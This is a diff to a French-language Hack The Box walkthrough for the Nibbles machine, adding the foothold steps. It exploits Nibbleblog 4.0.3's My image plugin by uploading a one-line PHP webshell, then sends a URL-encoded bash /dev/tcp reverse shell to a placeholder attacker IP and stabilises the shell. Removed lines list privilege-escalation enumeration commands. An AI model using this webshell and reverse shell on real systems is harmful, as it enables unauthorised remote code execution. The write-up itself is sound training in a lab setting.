@@ -540,25 +540,242 @@ Tu arrives alors dans le panneau d’administration de Nibbleblog.
 
 L’accès à cette interface est une étape importante : elle te donne accès aux fonctionnalités internes de Nibbleblog, notamment à la gestion des plugins.
 
----
+### Recherche d’une vulnérabilité connue
+
+La version de Nibbleblog étant maintenant identifiée, tu peux rechercher si cette version est associée à une vulnérabilité connue.
+
+Une recherche simple sur Google avec les mots-clés suivants permet de trouver plusieurs résultats pertinents :
+
+```text
+nibbleblog v4.0.3 vulnerabilities -nibbles
+```
+
+![Recherche Google sur les vulnérabilités de Nibbleblog v4.0.3](vulnerability-google-search.png)
+
+Parmi les résultats, le site Vulners référence une vulnérabilité publiée à l’origine par Curesec / Packet Storm :
+
+```url
+https://vulners.com/packetstorm/PACKETSTORM:133425
+```
+
+L’avis de sécurité décrit une vulnérabilité de type **Code Execution** dans **Nibbleblog 4.0.3**.
+
+Le point important est le suivant : le plugin **My image**, fourni par défaut avec Nibbleblog, conserve l’extension originale du fichier envoyé.
+
+L’application ne vérifie pas correctement le type réel du fichier ni son extension avant de l’écrire sur le serveur.
+
+Cela signifie qu’un utilisateur authentifié dans l’administration peut envoyer un fichier PHP à la place d’une image.
+
+Une fois le fichier uploadé, il peut ensuite être appelé depuis le navigateur, ce qui permet d’exécuter du code PHP côté serveur.
+
+L’avis précise que des identifiants administrateur sont nécessaires et que les warnings éventuels pendant l’upload peuvent être ignorés.
+
+Cela correspond à la situation observée : tu as accès à l’administration de Nibbleblog et le plugin **My image** est présent.
+
+L’objectif est donc maintenant de vérifier concrètement cette vulnérabilité sur la machine, en envoyant un petit fichier PHP de test via le plugin **My image**.
+
+### Exploitation du plugin My image
+
+Tu vérifies maintenant concrètement la vulnérabilité décrite dans l’avis de sécurité.
+
+Sur Kali, tu crées un fichier PHP minimal :
+
+```bash
+nano shell.php
+```
+
+Avec le contenu suivant :
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Ce fichier permet d’exécuter une commande passée dans le paramètre `cmd`.
+
+Depuis l’administration de Nibbleblog, tu ouvres le plugin **My image** et tu uploades le fichier `shell.php`.
+
+![Upload d’un fichier PHP via le plugin My image de Nibbleblog](MyImage.png)
+
+Comme indiqué dans l’avis de sécurité, les warnings éventuels pendant l’upload peuvent être ignorés.
+
+Le fichier est ensuite accessible à l’emplacement par défaut du plugin :
+
+```url
+http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php
+```
+
+Tu vérifies l’exécution de commande avec `id` :
+
+```url
+http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php?cmd=id
+```
+
+La réponse confirme que le PHP est exécuté côté serveur :
+
+```bash
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+```
+
+La vulnérabilité est confirmée : tu disposes maintenant d’une exécution de commande en tant qu’utilisateur `nibbler`.
+
+### Passage du webshell au reverse shell
+
+L’exécution de commande via le paramètre `cmd` fonctionne, mais ce n’est pas très confortable pour explorer la machine.
+
+Tu vas donc utiliser cette exécution de commande pour obtenir un shell interactif vers Kali.
+
+Sur Kali, tu ouvres d’abord un listener :
+
+```bash
+rlwrap -cAr nc -lvnp 4444
+```
+
+Ensuite, depuis le webshell PHP, tu exécutes une commande de reverse shell Bash.
+
+```url
+http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.x.x/4444+0>%261'
+```
+
+Les caractères spéciaux sont encodés pour que la commande passe correctement dans l’URL :
+
+- `%26` correspond au caractère `&` ;
+- les `+` remplacent les espaces dans la requête.
+
+Sur le listener Kali, tu reçois une connexion :
+
+```bash
+connect to [10.10.x.x] from (UNKNOWN) [10.129.x.x] ...
+bash: cannot set terminal process group ...
+bash: no job control in this shell
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
+```
+
+Tu obtiens ainsi un shell sur la machine cible en tant qu’utilisateur `nibbler`.
+
+Tu peux le confirmer avec :
+
+```bash
+id
+```
+
+Résultat :
+
+```bash
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+```
+
+Le shell initial est obtenu. Il reste maintenant à le stabiliser pour travailler plus confortablement.
+
+### Stabilisation du shell
+
+Le shell obtenu est fonctionnel, mais il reste limité : il n’a pas de vrai terminal interactif et affiche notamment le message suivant :
+
+```bash
+bash: no job control in this shell
+```
+
+Pour travailler plus confortablement, tu stabilises le reverse shell avec la méthode habituelle : {{< recette "stabiliser-reverse-shell" >}}
+
+
+
+
+
+Dans le shell obtenu sur la cible, tu lances d’abord Python pour obtenir un pseudo-terminal :
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Tu mets ensuite le shell en arrière-plan avec :
+
+```text
+Ctrl+Z
+```
+
+De retour sur Kali, tu désactives l’écho local et tu remets le shell au premier plan :
+
+```bash
+stty raw -echo; fg
+```
+
+Si l’affichage du terminal reste perturbé, tu peux désactiver à nouveau l’écho côté shell :
+
+```bash
+stty -echo
+```
+
+Tu définis ensuite le type de terminal :
+
+```bash
+export TERM=xterm
+```
+
+Tu ajustes enfin la taille du terminal selon les dimensions de ta fenêtre Kali :
+
+```bash
+stty rows 40 columns 120
+```
+
+Après stabilisation, tu vérifies l’utilisateur courant :
+
+```bash
+id
+```
+
+Résultat :
+
+```bash
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+```
+
+Tu te déplaces ensuite dans le répertoire personnel de l’utilisateur :
+
+```bash
+cd ~
+pwd
+```
+
+Résultat :
+
+```bash
+/home/nibbler
+```
+
+
+
+### Récupération du flag utilisateur
+
+Une fois dans le répertoire personnel de `nibbler`, tu listes les fichiers disponibles :
+
+```bash
+ls -l
+```
+
+Résultat :
+
+```bash
+total 8
+-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
+-r-------- 1 nibbler nibbler   33 Jun 12 09:01 user.txt
+```
+
+Le fichier `user.txt` est lisible par l’utilisateur courant.
+Tu peux donc récupérer le flag utilisateur :
+
+```bash
+cat user.txt
+ff92xxxxxxxxxxxxxxxxxxxxxxxxxxxffbb
+```
+
+La prise de pied est terminée : tu disposes d’un shell stabilisé en tant qu’utilisateur `nibbler`, et le flag utilisateur a été récupéré.
+
+L’étape suivante consiste à analyser le fichier `personal.zip` et à chercher une possibilité d’escalade de privilèges depuis cette session.
 
 
 
 ## Escalade de privilèges
 
-{{< escalade-intro user="ssh_user" >}}
-
-### Observation passive avec pspy64
-
-```bash
-./pspy64
-```
-
-Si système 32 bits :
-
-```bash
-./pspy32
-```
+{{< escalade-intro user="nibbler" >}}
 
 ### Vérification sudo
 
@@ -575,121 +792,6 @@ pwd
 uname -a
 hostname
 find /home /opt -type f -readable 2>/dev/null
-```
-
-### Capabilities
-
-```bash
-getcap -r / 2>/dev/null
-```
-
-### SUID
-
-```bash
-python3 suid3num.py
-```
-
-Alternative :
-
-```bash
-find / -perm -4000 -type f 2>/dev/null
-```
-
-### Services locaux
-
-```bash
-ss -tulnp
-```
-
-Alternative :
-
-```bash
-netstat -tulnp
-```
-
-### Recherche d’un service derrière un port local
-
-Exemple avec le port `8080` :
-
-```bash
-grep -r ':8080' /etc 2>/dev/null
-```
-
-Recherche élargie :
-
-```bash
-grep -r '8080' /etc 2>/dev/null
-```
-
-### Tunnel SSH vers un service local
-
-Exemple avec un service local sur `127.0.0.1:8080` :
-
-```bash
-ssh -L 8080:127.0.0.1:8080 user@target
-```
-
-Accès depuis Kali :
-
-```text
-http://localhost:8080
-```
-
-### Linpeas
-
-```bash
-./linpeas.sh
-```
-
-### Dernier recours : le kernel
-
-```bash
-uname -a
-./les.sh
-```
-
-### Conclusion de l’énumération privilege escalation
-
-À la fin de cette phase, tu peux résumer les pistes testées :
-
-* sudo
-* contexte utilisateur
-* fichiers lisibles
-* capabilities
-* SUID
-* cron et timers
-* services locaux
-* LinPEAS
-* kernel
-
-Dans ce cas précis, la piste exploitable est :
-
-```text
-<résumer ici la piste réellement exploitée>
-```
-
-### Exploitation de la piste identifiée
-
-Tu exploites ensuite la mauvaise configuration identifiée pendant l’énumération.
-
-```bash
-<commandes d’exploitation>
-```
-
-Tu confirmes l’élévation de privilèges :
-
-```bash
-whoami
-id
-hostname
-```
-
-Résultat attendu :
-
-```text
-root
-uid=0(root) gid=0(root) groups=0(root)
-machine
 ```
 
 ### root.txt
@@ -711,9 +813,6 @@ Cette étape termine l’escalade de privilèges.
 
 ---
 
-## Pièces jointes (optionnel)
 
-- Scripts, one-liners, captures, notes.  
-- Arbo conseillée : `files/<nom_ctf>/…`
 
 {{< feedback >}}
